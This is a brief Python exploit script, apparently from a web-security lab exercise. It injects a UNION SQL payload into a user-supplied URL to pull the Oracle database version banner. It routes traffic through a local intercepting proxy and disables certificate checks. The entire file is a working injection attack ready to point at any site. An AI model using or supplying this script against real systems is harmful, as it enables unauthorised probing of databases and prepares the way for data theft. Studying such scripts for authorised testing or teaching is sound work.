import re, sys, urllib3, requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli(url):
    payload = "' union select 'Mr.version', banner from v$version--"
    r = requests.get(url+payload, verify=False, proxies=proxies)
    suop = BeautifulSoup(r.text, 'html.parser')
    version = suop.find(text=re.compile('Oracle Database.*'))
    return f'[+] {version}'
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except:
        print('[*] Usage: %s <url>' % sys.argv[0])
        print('[*] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    print(sqli(url))